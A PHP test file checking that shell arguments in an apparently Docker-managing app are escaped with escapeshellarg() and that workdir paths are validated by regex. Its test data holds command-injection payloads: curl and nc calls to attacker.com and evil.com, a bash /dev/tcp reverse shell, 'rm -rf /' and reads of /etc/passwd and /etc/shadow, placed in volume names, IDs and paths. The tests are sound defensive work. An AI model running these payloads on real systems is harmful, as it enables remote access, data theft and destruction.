<?php

/**
 * Command Injection Prevention Tests
 *
 * Tests to ensure shell commands in model methods are properly escaped
 * against command injection attacks via escapeshellarg() and path validation.
 *
 * escapeshellarg() wraps input in single quotes where shell metacharacters
 * ($, `, ;, |, &, etc.) are treated as literal characters and NOT interpreted.
 *
 * Related Files:
 *  - app/Models/ApplicationPreview.php (forceDeleting hook)
 *  - app/Models/Application.php (deleteConfigurations, deleteVolumes, deleteConnectedNetworks)
 *  - app/Models/Service.php (deleteConfigurations, deleteConnectedNetworks)
 *  - app/Models/Server.php (stopUnmanaged, restartUnmanaged, startUnmanaged)
 */

// ─── ApplicationPreview ──────────────────────────────────────────────────────

test('ApplicationPreview escapes volume keys during force delete', function () {
    $maliciousKey = 'vol$(curl attacker.com)';
    $escaped = escapeshellarg($maliciousKey);

    // escapeshellarg wraps in single quotes making shell metacharacters literal
    expect($escaped)->toStartWith("'");
    expect($escaped)->toEndWith("'");

    $command = 'docker volume rm -f '.$escaped;
    expect($command)->toStartWith("docker volume rm -f '");
});

test('ApplicationPreview escapes network keys during force delete', function () {
    $maliciousKey = 'net;rm -rf /';
    $escaped = escapeshellarg($maliciousKey);

    // Single quotes prevent ; from being interpreted as command separator
    expect($escaped)->toBe("'net;rm -rf /'");

    $disconnectCmd = 'docker network disconnect '.$escaped.' saturn-proxy';
    $rmCmd = 'docker network rm '.$escaped;

    // The dangerous characters are safely wrapped in single quotes
    expect($disconnectCmd)->toContain("'net;rm -rf /'");
    expect($rmCmd)->toContain("'net;rm -rf /'");
});

test('ApplicationPreview escapes storage names during force delete', function () {
    $maliciousName = 'storage`whoami`';
    $escaped = escapeshellarg($maliciousName);

    // Backticks are safely wrapped in single quotes (no expansion)
    expect($escaped)->toBe("'storage`whoami`'");

    $command = 'docker volume rm -f '.$escaped;
    expect($command)->toBe("docker volume rm -f 'storage`whoami`'");
});

// ─── Application ─────────────────────────────────────────────────────────────

test('Application deleteVolumes escapes storage names', function () {
    $maliciousNames = [
        'vol$(id)',
        'vol;curl attacker.com',
        'vol`whoami`',
        'vol && rm -rf /',
        'vol | nc attacker.com 4444',
    ];

    foreach ($maliciousNames as $name) {
        $escaped = escapeshellarg($name);
        $command = 'docker volume rm -f '.$escaped;

        // All shell metacharacters are safely quoted in single quotes
        expect($escaped)->toStartWith("'");
        expect($escaped)->toEndWith("'");
        expect($command)->toStartWith("docker volume rm -f '");
    }
});

test('Application deleteConfigurations validates workdir path', function () {
    $validPaths = [
        '/var/data/saturn/applications/abc123',
        '/data/saturn/applications/uuid-with-dashes',
        '/tmp/test/path_with_underscores',
    ];

    foreach ($validPaths as $path) {
        expect(preg_match('/^[a-zA-Z0-9\-_\/\.]+$/', $path))->toBe(1,
            "Valid path should pass: {$path}"
        );
    }

    $maliciousPaths = [
        '/var/data/$(whoami)',
        '/data/saturn; rm -rf /',
        '/tmp/`id`/evil',
        '/data/test && curl attacker.com',
        '/data/test | nc evil.com 4444',
    ];

    foreach ($maliciousPaths as $path) {
        expect(preg_match('/^[a-zA-Z0-9\-_\/\.]+$/', $path))->toBe(0,
            "Malicious path should be rejected: {$path}"
        );
    }
});

test('Application deleteConnectedNetworks escapes uuid', function () {
    $maliciousUuid = 'abc123;curl attacker.com';
    $escaped = escapeshellarg($maliciousUuid);

    $disconnectCmd = 'docker network disconnect '.$escaped.' saturn-proxy';
    $rmCmd = 'docker network rm '.$escaped;

    // The semicolon is safely quoted in single quotes
    expect($escaped)->toBe("'abc123;curl attacker.com'");
    expect($disconnectCmd)->toContain("'abc123;curl attacker.com'");
    expect($rmCmd)->toContain("'abc123;curl attacker.com'");
});

// ─── Service ─────────────────────────────────────────────────────────────────

test('Service deleteConfigurations validates workdir path', function () {
    $maliciousPaths = [
        '/services/evil$(cat /etc/passwd)',
        '/services/test;id>/tmp/pwn',
        '/services/`reverse_shell`',
        '/services/a > /dev/null',
    ];

    foreach ($maliciousPaths as $path) {
        expect(preg_match('/^[a-zA-Z0-9\-_\/\.]+$/', $path))->toBe(0,
            "Path should be rejected: {$path}"
        );
    }
});

test('Service deleteConnectedNetworks escapes uuid', function () {
    $maliciousUuid = 'svc`bash -i >& /dev/tcp/10.0.0.1/9999 0>&1`';
    $escaped = escapeshellarg($maliciousUuid);

    $disconnectCmd = 'docker network disconnect '.$escaped.' saturn-proxy';
    $rmCmd = 'docker network rm '.$escaped;

    // Reverse shell payload safely wrapped in single quotes
    expect($escaped)->toStartWith("'");
    expect($escaped)->toEndWith("'");
});

// ─── Server ──────────────────────────────────────────────────────────────────

test('Server stopUnmanaged escapes container id', function () {
    $maliciousId = 'abc123;rm -rf /';
    $escaped = escapeshellarg($maliciousId);

    $command = 'docker stop -t 0 '.$escaped;
    expect($command)->toBe("docker stop -t 0 'abc123;rm -rf /'");
});

test('Server restartUnmanaged escapes container id', function () {
    $maliciousId = 'container$(curl attacker.com)';
    $escaped = escapeshellarg($maliciousId);

    $command = 'docker restart '.$escaped;
    expect($command)->toStartWith("docker restart '");
    expect($command)->toEndWith("'");
});

test('Server startUnmanaged escapes container id', function () {
    $maliciousId = 'container`id`';
    $escaped = escapeshellarg($maliciousId);

    $command = 'docker start '.$escaped;
    expect($command)->toBe("docker start 'container`id`'");
});

// ─── Cross-cutting ───────────────────────────────────────────────────────────

test('escapeshellarg neutralizes all shell metacharacters', function () {
    $dangerousInputs = [
        'test;id',
        'test|cat /etc/passwd',
        'test&curl evil.com',
        'test&&whoami',
        'test||true',
        'test`id`',
        'test$(whoami)',
        'test > /tmp/evil',
        'test < /etc/shadow',
        "test\nid",
    ];

    foreach ($dangerousInputs as $input) {
        $escaped = escapeshellarg($input);

        // All inputs are wrapped in single quotes, making metacharacters literal
        expect($escaped)->toStartWith("'");
        expect($escaped)->toEndWith("'");
    }
});

test('escapeshellarg handles single quotes in input', function () {
    // Single quotes in input require special escaping: close quote, escaped quote, open quote
    $input = "test'injection";
    $escaped = escapeshellarg($input);

    expect($escaped)->toBe("'test'\\''injection'");
});
